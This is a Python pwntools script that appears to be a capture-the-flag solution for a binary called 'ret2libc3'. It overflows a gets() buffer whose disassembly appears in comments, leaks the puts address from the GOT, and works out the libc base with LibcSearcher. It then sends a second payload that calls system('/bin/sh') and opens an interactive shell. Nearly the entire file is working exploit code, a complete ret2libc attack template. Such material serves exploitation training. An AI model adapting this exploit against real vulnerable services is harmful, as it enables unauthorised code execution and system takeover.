#-*- coding: utf-8 -*-
from pwn import *
from LibcSearcher import LibcSearcher
#context.log_level = 'debug'
#context.arch = 'i386'/'amd64'

elf = ELF('./ret2libc3')
#libc_so  = ELF('./') 

sh = process('./ret2libc3')
#sh = remote('', )

vul_addr = 0x08049186
puts_plt  = elf.symbols['puts']
print("puts_plt=>", hex(puts_plt))

puts_got  = elf.got['puts']
print("puts_got=>", hex(puts_got))

data = sh.recvuntil(b'Can you find it !?\n')
print("recvuntil==>>", data)
# gef➤  disass vul_func
# Dump of assembler code for function vul_func:
#    0x08049186 <+0>:     push   ebp
#    0x08049187 <+1>:     mov    ebp,esp
#    0x08049189 <+3>:     push   ebx
#    0x0804918a <+4>:     sub    esp,0x74
#    0x0804918d <+7>:     call   0x804922d <__x86.get_pc_thunk.ax>
#    0x08049192 <+12>:    add    eax,0x2e62
#    0x08049197 <+17>:    sub    esp,0xc
#    0x0804919a <+20>:    lea    edx,[ebp-0x74]
#    0x0804919d <+23>:    push   edx
#    0x0804919e <+24>:    mov    ebx,eax
#    0x080491a0 <+26>:    call   0x8049040 <gets@plt>
#    0x080491a5 <+31>:    add    esp,0x10
#    0x080491a8 <+34>:    mov    ebx,DWORD PTR [ebp-0x4]
#    0x080491ab <+37>:    leave
# => 0x080491ac <+38>:    ret


         # padding  + push ebx + push ebp
payload  = b'a'*112 + b'0' * 4 + b'0'*4
payload += p32(puts_plt) + p32(vul_addr) + p32(puts_got)

# p32(puts_plt) : b'P\x90\x04\x08'

#pwnlib.gdb.attach(proc.pidof(sh)[0]) 
sh.sendline(payload)
a = sh.recv(4)
print("libc_put===>>",a)

puts_addr = u32(a)
print("puts_addr=>", hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')

#########################################################

system_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump('str_bin_sh')

sh.recvuntil(b'Can you find it !?\n')

payload  = b'a'*112 + b'0' * 4 + b'0'*4
payload += p32(system_addr) + p32(vul_addr) + p32(bin_sh_addr)

sh.sendline(payload)
sh.interactive()
